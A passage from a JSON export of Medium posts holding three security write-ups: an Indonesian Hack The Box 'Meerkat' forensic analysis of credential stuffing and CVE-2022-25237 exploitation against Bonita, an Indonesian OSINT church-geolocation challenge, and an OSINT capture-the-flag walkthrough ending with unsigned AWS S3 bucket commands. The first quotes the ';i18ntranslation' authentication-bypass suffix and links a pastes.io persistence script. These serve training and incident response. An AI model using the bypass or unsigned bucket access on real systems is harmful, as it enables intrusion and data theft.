    "id": "https://medium.com/p/359b51de8d39",
    "slug": "https://medium.com/p/359b51de8d39",
    "title": "HTB — Sherlock — Meerkat",
    "content": "\n<h3>HTB — Sherlock — Meerkat</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/800/1*JnN26GK8MUnHt1i_Vz74SA.png\"><figcaption>HTB — Meerkat</figcaption></figure><h4>SHERLOCK SCENARIO:</h4>\n<blockquote>As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren’t the most security aware. As our new security provider we’d like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</blockquote>\n<h4>CHALLENGE STEP-BY-STEP</h4>\n<p>Pada Challenge ini, diberikan 2 file.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/970/1*Zg-YL9qTNkNAPatqMh2ofA.png\"></figure><p>Untuk menjawab pertanyaan dari challenge ini, saya harus menganalisa file log <strong>.pcap</strong> tersebut.</p>\n<p>Disini saya menggunakan tools <strong>wireshark </strong>untuk melakukan analisa pcap traffic dan terlihat beberapa aktifitas request dengan menggunakan Method <strong>POST </strong>ke IP 172.31.6.44 . dengan endpoint &gt; /bonita/loginservice.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*TNH7dKAqTZQAil08XGtoGQ.png\"></figure><p>Dari hasil analisa sementara, saya mendapatkan keyword “Bonita” dan disini saya mencoba untuk melakukan pencarian pada file .json bahwa Aplikasi yang dijalankan adalah Web Apps dari Bonitasoft.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*UW2JWnID8HYa1tLr3voSqQ.png\"></figure><p>Kembali ke Wireshark, disini saya berasumsi bahwa Attacker melakukan Brute Force pada aplikasi tersebut. dimana terlihat beberapa Request dengan Response 401 yang mana menunjukkan “Unauthorized Access” seperti yang terlihat pada gambar berikut:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/957/1*xQZ6LMrEmj3VIMfuipOJ4A.png\"><figcaption>1</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*aBcKcyrvi5c3OllcsDtzEQ.png\"><figcaption>2</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/976/1*xtFe03fzPPBnXe3HQzTWBA.png\"><figcaption>3</figcaption></figure><p>Pada hasil Capture diatas, saya mencoba Follow TCP Stream pada HTTP Request tersebut dan mendapati beberapa kredensial berbeda telah digunakan, dimana asumsi pertama saya benar bahwa attacker melakukan <strong><em>brute force </em></strong>login untuk mencoba mendapatkan akses login ke aplikasi.</p>\n<p>Kemudian saya mencoba melihat kembali pada file <strong>.json</strong> dan terlihat bahwa terdapat alert yang menunjukkan *Default User Login Attempt* pada web tersebut, yang mana masuk ke dalam <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25237\"><strong>CVE-2022–25237</strong></a>.</p>\n<blockquote><strong>CVE-2022–25237 Detail</strong></blockquote>\n<blockquote>Description:</blockquote>\n<blockquote>Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions.</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*YauUua-RPS27fSTXSsJ2BQ.png\"></figure><p>Setelah membaca dokumentasi CVE , saya menemukan pernyataan bahwa penyerang menambahkan <strong>;i18ntranslation</strong> atau <strong>/../i18ntranslation/</strong> di akhir URL.</p>\n<p>Kembali melanjutkan analisa pada file <strong>.pcap</strong> tadi, dimana pada setiap username yang Attacker coba input selalu menggunakan domain <a href=\"mailto:test@forela.co.id\"><em>@forela.co.</em></a><em>uk</em>, yang mana itu meng-indikasikan bahwa attacker menggunakan Email Company.</p>\n<p>Bisa disimpulkan Attacker Menggunakan teknik <strong>Credential Stuffing</strong>.</p>\n<blockquote>Credential stuffing adalah jenis serangan siber di mana penyerang mengumpulkan kredensial akun yang dicuri, biasanya terdiri dari daftar nama pengguna atau alamat email dan kata sandi yang sesuai, dan kemudian menggunakan daftar tersebut untuk mencoba masuk ke akun di situs web dan aplikasi yang berbeda.</blockquote>\n<p>Untuk melihat jumlah Request Attempt yang dilakukan oleh Attacker, saya menggunakan filter “urlencode-form.key == username” pada wireshark, berikut hasilnya:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*fr5KbSWNmx5J3kCXw9mKYQ.png\"></figure><p>Untuk melihat value dari “username”, saya menggunakan fitur custom column pada wireshark.</p>\n<p>Klik edit → preferences → columns , kemudian set tipe column.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*2_PR22hClRHaTkNaPg7dDA.png\"></figure><p>Terdapat 118 Log yang terlihat.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*bxm8cTEjitMlkfSQ8rTwoA.png\"></figure><p>Pada log tersebut , terlihat ada beberapa request yang tidak perlu. disini saya melakukan filter kembali menggunakan “<strong>urlencoded-form.key == “username” &amp;&amp; !(http contains “install”</strong>)”. Maka akan muncul seperti berikut:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*c1XbrUvJ-5A3J4OiblkXiw.png\"></figure><p>Terdapat total 59 Request, dimana masih ada beberapa duplicate request pada log tersebut.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*zDJG6HPnq47IyEIDzFYIFg.png\"></figure><p>Pada tahap selanjutnya, saya harus mencari tau Requests Login Attempt yang berhasil dilakukan oleh attacker.<br>Saya kembali melakukan filter untuk mencari Status Code yang bernilai dibawah 300 dengan menggunakan filter “<strong>http.response.code &lt; 300</strong>”</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*cNHTDSZxmSOu0DFE-z7jHA.png\"></figure><p>Terlihat bahwa username: <a href=\"mailto:seb.broom@forela.co.uk\">seb.broom@forela.co.uk</a> berhasil melakukan login ditandai dengan Response Code 204.</p>\n<p>Tahap selanjutnya saya harus mencari tau Text sharing yang digunakan oleh attacker, untuk menjawab ini saya mencoba melakukan filter kembali dengan menggunakan “<strong>http.request.method</strong>”. Dan terlihat parameter yang digunakan oleh Attacker untuk melakukan RCE dimana Attacker menggunakan script yang disimpan di pastes.io</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*VQ_cOYvXXuv4bYilrGS2Ow.png\"></figure><p>Selanjutnya saya harus mencari tau public key yang digunakan oleh Attacker untuk mendapatkan Persistence pada target host.<br>Untuk mendapatkan public key, saya harus meng-ekspor objek HTTP dari paket sebelumnya.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/749/1*GOOrvHQQySEJBXQt2FEIqg.png\"></figure><p>Ekspor dan Simpan file tersebut, kemudian gunakan command `<strong>file</strong>` untuk memastikan bahwa yang telah di eksport merupakan file <strong>.json</strong>, selanjutnya gunakan command `<strong>strings</strong>` untuk melihat informasi pada file tersebut.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*fLp6dRYn4uEAkVPhkfVwGA.png\"></figure><p>Terlihat Endpoint berisi script yang digunakan oleh Attacker dan kemudian saya mencoba akses Endpoint tersebut dan akan terlihat hasil seperti berikut:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*XO264XatGzZybuTgTpFFpA.png\"></figure><p>Terlihat pada URL : <a href=\"https://pastes.io/raw/hffgra4unv\">https://pastes.io/raw/hffgra4unv</a> , dimana file “hffgra4unv” berisikan authorized keys SSH.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Iemz4nOKSGP6gOkgQOxCqw.png\"></figure><p>Selanjutnya, untuk mencari <strong>Mitre Technique</strong> yang digunakan oleh Attacker untuk melakukan persistence pada host, kunjungi website <a href=\"https://attack.mitre.org/techniques/T1110/004/\"><strong>MITRE ATT&amp;CK</strong></a><strong> </strong>dan pada form pencarian gunakan keyword “ssh”.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*dbb1myxjTYd9PEfBV_xImQ.png\"></figure><p>Pada hasil pertama, terlihat bahwa <strong>Sub-Technique T1098.004 </strong>sangat relevan dengan case ini.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*1DmH-MAL6m0xUr3aeMrLFQ.png\"></figure><h4>LESSON LEARNED</h4>\n<ul>\n<li>Meng-identifikasi serangan Credential Stuffing</li>\n<li>Melakukan riset CVE yang terdampak pada Bonitasoft</li>\n<li>Melakukan Packet Filtering dan menggunakan fitur Custom Column pada Wireshark</li>\n</ul>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=359b51de8d39\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "incident-response",
      "hackthebox-challenge",
      "network-analysis"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/htb-sherlock-meerkat-359b51de8d39?source=rss-e8b9da247cdf------2"
  },
  {
    "id": "https://medium.com/p/6313e8d9f067",
    "slug": "https://medium.com/p/6313e8d9f067",
    "title": "OSINT Challenge — Deep Geo-Analysis using Imagery Intelligence Technique",
    "content": "\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/817/1*J9bltB-qyybNtmuCqSSeuA.png\"></figure><blockquote>OSINT atau <em>Open Source Intelligence</em> adalah metodologi yang memanfaatkan informasi yang tersedia untuk umum untuk pemantauan maupun proses investigasi. Salah satu aspek OSINT yang menarik adalah geo-analisis melalui gambar, yang sering disebut sebagai Imagery Intelligence (IMINT).</blockquote>\n<blockquote>OSINT telah mendefinisikan kembali seni penyelidikan/investigasi. Dengan memanfaatkan data yang dapat diakses oleh siapa saja yang memiliki koneksi internet, teknik OSINT memiliki potensi untuk mengungkap permata tersembunyi yang mungkin terlewatkan oleh metode tradisional. Dalam konteks tantangan ini, saya memanfaatkan kekuatan OSINT untuk mengekstrak informasi berharga dari gambar — sebuah praktik yang mencerminkan skenario dunia nyata di mana penyelidik, jurnalis, dan peneliti harus menyatukan informasi untuk mengungkap kebenaran.</blockquote>\n<blockquote>Secara singkat, IMINT adalah jenis intelijen yang digunakan untuk mengumpulkan informasi tentang objek atau area melalui gambar, dimana strategi ini bertujuan untuk menggali lebih dalam dari sekadar permukaan informasi yang dapat diperoleh dari OSINT. Dengan menggunakan IMINT, kita dapat memperoleh informasi yang lebih detail dan akurat tentang suatu lokasi atau target.</blockquote>\n<h4>CHALLENGE</h4>\n<p>Ketika Robert (@osintaclaus) memposting tantangannya di Twitter untuk memecahkan kode Geolokasi gambar yang penuh teka-teki menggunakan teknik <strong>OSINT </strong>dan <strong>IMINT</strong>. Disini saya mencoba untuk menerima tantangan tersebut.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/596/1*tx86nBC7sMi8pvh6ASdUiw.png\"></figure><p>Pertama-tama saya coba untuk mendownload gambar tersebut.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*dCDYEdnWotIitvC2_9QedQ.jpeg\"></figure><p>Setelah mengunduh gambar, saya memulai analisis terperinci untuk mengungkap potensi petunjuk yang mengisyaratkan asal-usulnya. Khususnya, perhatian saya langsung tertuju pada sebuah gereja yang digambarkan diatas. Bagian tengah arsitektur ini dibuat menggunakan batu bata merah yang khas dan menampilkan desain kaca mencolok yang menghiasi struktur gereja dengan cantik dan ada sebuah menara yang berdiri tegak.</p>\n<p>Di antara detail yang rumit, saya mengamati bahwa bagian luar gereja menampilkan jendela merah berbingkai putih yang diposisikan di atas bangunan. Fitur arsitektur ini selaras dengan gaya khas yang sering ditemukan di gereja-gereja. Namun, di luar daya tarik visualnya, gambar tersebut tampaknya menyimpan petunjuk geografis yang matang untuk ditafsirkan.</p>\n<p>Pada saat saya mencoba menganalisa lebih dalam, saya menemukan tanda biru cerah yang menampilkan kata-kata “<em>Stationsstraat</em>.” Rambu ini bukan hanya elemen visual, itu berfungsi sebagai petunjuk penting untuk mengungkap lokasi gambar. Dari perspektif linguistik, saya melihat bahwa <em>“Stationsstraat”</em> berasal dari kata <strong>Belanda </strong><em>“straat”</em> yang diterjemahkan menjadi <em>“jalan.”</em> Hubungan linguistik ini merupakan indikasi kuat bahwa lokasi gereja tersebut terdapat di Negara <strong>Belanda</strong>. Dan selanjutnya, tanda lain dalam gambar berisi kata Belanda “<em>uitgezonderd</em>” yang disertai gambar sepeda, yang berarti “<em>Kecuali</em>” dalam bahasa Inggris. Jembatan linguistik ini memberikan konteks yang berharga, menyiratkan pembatasan atau izin khusus dalam konteks Bahasa <strong>Belanda</strong>.</p>\n<p>Dari hasil pengamatan dari segi arsitektur bangunan dan dari hasil analisa sementara diatas bahwa gereja tersebut bisa saja terletak di sekitar Benua Eropa. Namun, dimana letak akuratnya? mari kita lakukan analisa lebih lanjut.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/448/1*R_pAuNNFOtN36yBRV2KrMA.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/455/1*1hhJ8iCBbBhZpN1CbtnvpA.png\"></figure><p>Saya telah mencoba untuk mencari informasi nama jalan tersebut di berbagai sumber dan saya mendapatkan bahwa <em>Stationsstraat</em> adalah nama jalan yang umum, baik di Negara <strong>Belanda </strong>maupun <strong>Belgia</strong>. Ejaan <em>Stationstraat </em>juga digunakan disana.</p>\n<p>Sekilas pada hasil <strong>Wikipedia </strong>menggarisbawahi keberadaan banyak kota di <strong>Belgia </strong>dan <strong>Belanda </strong>yang memiliki nama jalan “<em>Stationsstraat</em>”. Yang mengejutkan saya, nama yang ada di mana-mana ini telah ditemukan di sekitar 30 kota. Cakupan yang luas ini membuat tantangan yang cukup besar dalam hal penyelidikan dan investigasi. Kebutuhan untuk melakukan filter dengan cermat untuk mencari sejumlah besar lokasi yang potensial ini sangat menantang dan sekaligus menarik.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/888/1*Iw5EbYWYZLI1Z3OMM_lzdA.png\"></figure><p>Temuan pada <strong>Wikipedia </strong>mengarahkan saya ke <strong>Belgia </strong>dan <strong>Belanda</strong>. Namun, jika kita harus analisa 30 kota di kedua negara itu semakin menyulitkan pencarian. Jadi saya memutuskan untuk menggunakan teknik <strong><em>Reverse Image</em></strong> untuk mempersempit pencarian dan mempersingkat proses penyelidikan.</p>\n<p>Kehebatan teknik <strong><em>Reverse Image</em></strong> terletak pada kemampuannya untuk mereferensi dengan metode Cross-Image menggunakan database visual yang sangat luas dari seluruh web. Proses ini memiliki potensi secara signifikan dalam mempersempit kota-kota yang menuntut perhatian lebih dekat. Meskipun tantangannya tetap rumit, Pencarian dengan metode <strong><em>Reverse Image</em></strong> sangat cepat untuk memecahkan teka-teki ini.</p>\n<p>Untuk mempersempit lokasi, saya menggunakan “Google Lens,” alat pemindai gambar dalam ekosistem Google. Dengan menggunakan “Google Lens,” saya memasukkan gambar ke dalam sistem, bertujuan untuk menemukan kecocokan atau gambar serupa secara online. Pendekatan ini menggabungkan analisis manusia dengan bantuan AI, secara efektif memajukan penyelidikan. Integrasi metode tradisional dan inovasi teknologi mencontohkan esensi OSINT</p>\n<p>“Google Lens” memberikan berbagai kecocokan terkait gereja. Namun, untuk menyempurnakan pencarian, saya menambahkan “<strong>Belanda </strong>+ <strong>Belgia</strong>” ke kueri. Modifikasi ini bertujuan untuk mengarahkan pencarian ke gereja-gereja yang memiliki kesamaan visual di kedua negara. Tujuannya adalah untuk menunjuk karakteristik arsitektur, meningkatkan kemungkinan mengidentifikasi lokasi yang sulit dipahami. Pendekatan terfokus ini menunjukkan perpaduan antara bantuan teknologi dan kecermatan investigasi, yang melambangkan sifat dinamis dari strategi OSINT.</p>\n<p>Di antara berbagai hasil, gambar yang sangat mirip menarik perhatian saya — itu cocok dengan kata “<em>MariaKerk</em>” dari <strong>Wikidata</strong>. Penemuan ini menandai tonggak penting dalam penyelidikan. Keselarasan elemen visual antara gambar dan gambar “<em>MariaKerk</em>” menunjukkan kemungkinan hubungan ke lokasi yang sulit dipahami.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*tIwGerm5ERelKeheKu6Oog.png\"></figure><p>Setelah meng-klik gambarnya, saya diarahkan ke situs web <strong>Wikidata</strong>. Gambar tersebut dikaitkan dengan “<em>Mariakerk</em>,” sebuah gereja yang berada di kota <strong>Apeldoorn </strong>di <strong>Belanda</strong>.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*L2xJ803poC-n-Ijsd1VK8g.png\"></figure><p>Berikut gambar ukuran aslinya.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*5DHleWocGAZ3YMmTFutFAA.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/322/1*2IkBQY8rxQCjfZldrolksQ.png\"></figure><p>Saya memutuskan untuk googling kembali agar mendapatkan lebih banyak informasi tentang kota tersebut. <strong>Apeldoorn </strong>adalah kota kecil di <strong>Belanda</strong> yang berjarak sekitar 1 jam perjalanan dari ibu kota <strong>Amsterdam</strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*B_yAk3i2JYbAF_6Xbd0KpQ.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*G0g5IXpQdg4PkraYSMy48w.png\"></figure><p>Saya memutuskan untuk melihat semua daftar Gereja yang ada di kota <strong>Apeldoorn</strong>.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*tE4TwD6zIEkfM-QdL2cjxg.png\"></figure><p>Saya menemukan sebuah situs yang memuat list daftar Gereja yang ada di kota tersebut.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/855/1*mFFCiaum9t8sBKue3IsR8Q.png\"></figure><p>Disini saya mencoba membuka situs web resmi “<strong>Badan Warisan Budaya Belanda</strong>” <strong>(Rijksdienst voor het Cultureel Erfgoed)</strong> untuk memeriksa Gereja yang masuk kedalam itus Warisan Budaya di <strong>Belanda</strong>.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*4ryRtvKVh1F3CHswSsqpcQ.png\"></figure><p>Untuk mencari informasi selanjutnya, saya menggunakan teknik <em>Google Dorks</em> untuk menemukan detail lokasi dan nama gereja dalam bahasa Belanda dengan kata “Kerk” di dalam situs resmi “<strong>Badan Warisan Budaya Belanda</strong>”.</p>\n<pre>inurl:monumentenregister.cultureelerfgoed.nl/ + intext:Kerk</pre>\n<p>Dan hasilnya mendapatkan beberapa informasi berikut :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*HzPSnd79uJ4ZUlIFwPe03w.png\"></figure><p>Hal itu memberi saya rincian dan informasi lengkap tentang gereja tersebut dan juga lokasinya dari situs web <em>“The Catholic Directory”</em>.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*DIRLBetVsvnESwvkykWmIA.png\"></figure><p>Dengan menggunakan Google Dorks kembali, saya juga menemukan file PDF dengan informasi terkait gereja potensial tersebut. termasuk Nomor monumen, tanggal pendaftaran, lokasi, jenis monumen (gereja), dan lain-lain.</p>\n<p><a href=\"https://monumentenregister.cultureelerfgoed.nl/monumenten/pdf/8161\">LINK PDF!</a></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/692/1*RDy1HUt5S4yP5vfpP9Z5-g.png\"></figure><p>Saya menemukan bahwa gereja ini memiliki nama resmi selain “<em>Mariakerk</em>” — nama resminya adalah “<em>Onze Lieve Vrouwe ten Hemelopnemingkerk</em>”. Kemudian saya memutuskan untuk mencari di Google dan menemukan lebih dari 20.000 hasil yang mana itu sangat banyak sekali …</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*EMkwvNzzcFQEgpoEWW-cCw.png\"></figure><p>Saya telah memutuskan untuk melakukan pencarian saya melalui Google Dorks dan menambahkan perintah “location:”, yang memberi saya 5 hasil. Seperti yang dapat Anda lihat, nama gereja dan juga alamat dari situs web <em>“The Catholic Directory”</em>.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*90t1UYS156mUQBL3UlJmKA.png\"></figure><p>Gambar yang sama dari <strong>Wikidata</strong>.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/797/1*B2J864KwncoCQ9DnQBraew.png\"></figure><p>Berikut adalah kemungkinan lokasi gereja dengan nama baru yang saya temukan, dan gambar yang sama dari situs web <strong>Wikidata</strong> yang sebelumnya memberi saya nama “<em>Mariakerk</em>”.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*qUkJgqmYoqloCnHKf-SJpg.png\"></figure><p>Dengan penyelidikan OSINT yang membuahkan hasil, saya mengalihkan perhatian saya pada semua temuan berharga yang dikumpulkan dari berbagai sumber. Namun, hasil sebenernya dari proses menyelesaikan challenge ini terletak pada fase menggali informasi fisik dari lokasi tersebut.</p>\n<p>Fokus saya beralih ke alamat berikut<strong> : “Hoofdstraat 18, 7311 KB Apeldoorn, Belanda”. </strong>Dengan berbekal <strong>Google Earth PRO</strong>, sebuah alat yang mencakup citra satelit 3D, peta, dan tampilan jalan. Kemampuan <strong>Google Earth PRO</strong> terbukti sangat berharga, menawarkan eksplorasi multidimensi dari lokasi tersebut.</p>\n<p>Dengan <strong>Google Earth PRO</strong> memungkinkan saya untuk tidak hanya menyaksikan lokasi tetapi juga melihatnya dalam konteks lingkungannya. Perspektif holistik ini merangkum esensi OSINT — mengubah petunjuk digital menjadi pengetahuan nyata melalui perpaduan teknologi dan hasil investigasi.</p>\n<p>Puncak dari challenge ini bukan hanya identifikasi lokasi gereja, itu adalah sintesis data, teknologi, dan eksplorasi saja. Kemampuan untuk menjembatani dunia virtual dan fisik melalui alat-alat seperti <strong>Google Earth PRO</strong> mewujudkan inti dari OSINT.</p>\n<p>Berikut hasil akhir dari analisis Gambar pada challenges OSINT kali ini.</p>\n<pre>Hoofdstraat 18, 7311 KB Apeldoorn, Belanda</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Vhd4fUjaYJW-kmJf8PHrzg.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*NAjuS-3TEwsaVR3LDYBTfA.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*FQRPDaohQ056jMDy5fbfiQ.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*IxXYE2DzyOrcS1QQuJKSCg.png\"></figure><p>Sekian dan Terima kasih…</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=6313e8d9f067\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "imint",
      "osint-investigation",
      "geolocation"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/osint-challenge-the-church-deep-image-analysis-using-imagery-intelligence-technique-6313e8d9f067?source=rss-e8b9da247cdf------2"
  },
  {
    "id": "https://medium.com/p/87bda73e0e0b",
    "slug": "https://medium.com/p/87bda73e0e0b",
    "title": "SecOps — OSINT Badge Hacking",
    "content": "\n<h3>SecOps — OSINT Badge Hacking</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/395/1*0MRcaMaocxys1tB54JjWAA.png\"></figure><blockquote>OSINTOrg has created some cool badges. You need to perform an open-source intelligence assessment on their organization and find out about their internet presence and employee information to get the flags and the cool badges.</blockquote>\n<blockquote><em>We will resolve VulnMachine’s OSINT challenges that involve searching social networks, gist, and Jenkins servers for information to find flags and complete challenges.</em></blockquote>\n<blockquote>These challenges are part of a series of OSINT (open-source intelligence) challenges, in which we’re asked to evaluate open-source intelligence on an organization’s external assets.</blockquote>\n<ul>\n<li>The first challenge is to find the organization’s social media accounts and its employees’ profiles.</li>\n<li>For the second challenge, you should look for additional information in git repositories belonging to the organization and its employees.</li>\n<li>In the third challenge, the goal is to find and analyze Jenkins’ production server.</li>\n<li>Finally, in the fourth challenge, you will have to identify cloud-based assets related to the organization.</li>\n</ul>\n<p><strong>OSINT #1</strong></p>\n<p>We’re told to focus on social networks first; so let’s see if there is a social media account called OSINTOrg. Although we could do this manually, it would be better to use a name checker tool for automation purposes. We will use namechecker’s online service, but you could use the Sherlock tool or a similar tool.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/562/1*CgS01sAfEv7NlBbUaSUJtg.png\"></figure><p>We get an account on Twitter related to the organization.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/743/1*NHS-4K8mIDkWuRxhl5x5tw.png\"></figure><p>Reviewing the profile, we see that 3 of its followers include a reference to this account in their bio.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/734/1*TeQRTGVtD0mI0gUtWoOr_g.png\"></figure><p>By analyzing the interactions between profiles, we can obtain our first flag, on a tweet response.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/745/1*Efhzh2WTImayWZ1m6arqxA.png\"></figure><p><strong>OSINT #2</strong></p>\n<p>From the tweet of the previous challenge we can see a link pointing to a repo of a GitHub organization, although the link does not appear to be public it opens the door to investigate the organization’s repository.</p>\n<p>Reviewing the organization, we can find 2 users linked to it, they seem to correspond to the Twitter accounts that interacted in the previous tweet.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*T_6nVus4-umS19fEqnyB4g.png\"></figure><p>Looking for the organization and users in the different GitHub platforms (GitHub, gist, and GitLab), we found some gist users.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*8Bj3D356hw_aEsP0GTikIg.png\"></figure><p>Reviewing the gists, we can find a flag in the comments.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Lu7NaCukyGqVhd9mV7DFOg.png\"></figure><p><strong>OSINT #3</strong></p>\n<p>Starting from the end of the previous challenge, it will be easy to find the domain that points to the Jenkins “<em>osintorg-emilyosintorg-prod.osintorg.com</em>”.</p>\n<p>We can see that, although when accessing from the browser directly, we can’t see anything, there is an associated DNS.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/653/1*hFdJtsGsMR4eA8hHXJK4rg.png\"></figure><p>Now we have two options, either we can look for the standard Jenkins port or we can scan the server with nmap looking for an open port. In both cases, we will reach the Jenkins service on port 8080.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/855/1*h9w1P46g9IIYegLA8RoloA.png\"></figure><p>We can easily access the credentials stored on the server since we do not need credentials to access the server.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*5kZy9APweRBA64BfpfYWsQ.png\"></figure><p><strong>OSINT #4</strong></p>\n<p>For the last flag, we will focus on information related to deployments. Within the deployment logs, we can see the address of an AWS S3 bucket.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*-JDRMzDDOraDvry8LmU3AQ.png\"></figure><p>If we list the bucket, we see a file called FLAG.txt, and we can access it using the CLI. The whole process is explained here :</p>\n<pre>aws s3 ls s3-osint-jenkins --no-sign-request</pre>\n<ul><li>aws s3 ls s3-osint-jenkins --no-sign-request</li></ul>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/488/1*bZA2VL6C6NHCoC8zLZ17UQ.png\"></figure><p>This command is used to list the files and directories within an S3 bucket named “s3-osint-jenkins”. When executed, the ls option indicates that you want to list the contents of the bucket. The --no-sign-request flag is used to bypass the request signing process, this works only in situations where public access is enabled.</p>\n<pre>aws s3 cp s3://s3-osint-jenkins/FLAG.txt . --no-sign-request</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/601/1*MffEnZxA06u6qUQ612aV4Q.png\"></figure><p>You can use the following command to copy a file from the S3 bucket named “s3-osint-jenkins” to the current directory on your local machine.</p>\n<blockquote>The path s3://s3-osint-jenkins/FLAG.txt specifies the location of the file you want to copy. The dot (.) indicates the current directory as the destination for the copy.Similarly to the previous command, the --no-sign-request option is used to skip the request signing process.</blockquote>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=87bda73e0e0b\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "osint-investigation"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/secops-osint-badge-hacking-87bda73e0e0b?source=rss-e8b9da247cdf------2"
  },
  {
    "id": "https://medium.com/p/41b061e89a96",
    "slug": "https://medium.com/p/41b061e89a96",
    "title": "HackTheBox — CozyHosting",
